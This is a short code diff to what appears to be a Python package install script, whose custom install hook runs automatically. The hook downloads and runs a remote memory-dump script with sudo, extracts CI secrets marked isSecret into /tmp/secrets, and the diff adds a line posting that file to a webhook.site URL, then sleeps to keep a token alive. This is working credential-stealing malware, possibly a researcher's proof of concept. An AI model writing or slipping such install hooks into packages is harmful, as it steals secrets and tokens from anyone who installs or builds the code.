@@ -7,8 +7,10 @@ class CustomInstallCommand(install):
         bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
         subprocess.run(["bash", "-c", bash_command])
 
-        another_command = "curl -X PUT --upload-file /tmp/secrets https://YOUR-BUCKET.s3.us-east-1.amazonaws.com/secrets.txt"
-        subprocess.run(["bash", "-c", another_command])
+        webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
+        exfil_command = f"curl -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/secrets {webhook_url}"
+        subprocess.run(["bash", "-c", exfil_command])
+
 
         subprocess.run(["bash", "-c", "sleep 6000"])  # Keep token alive
 
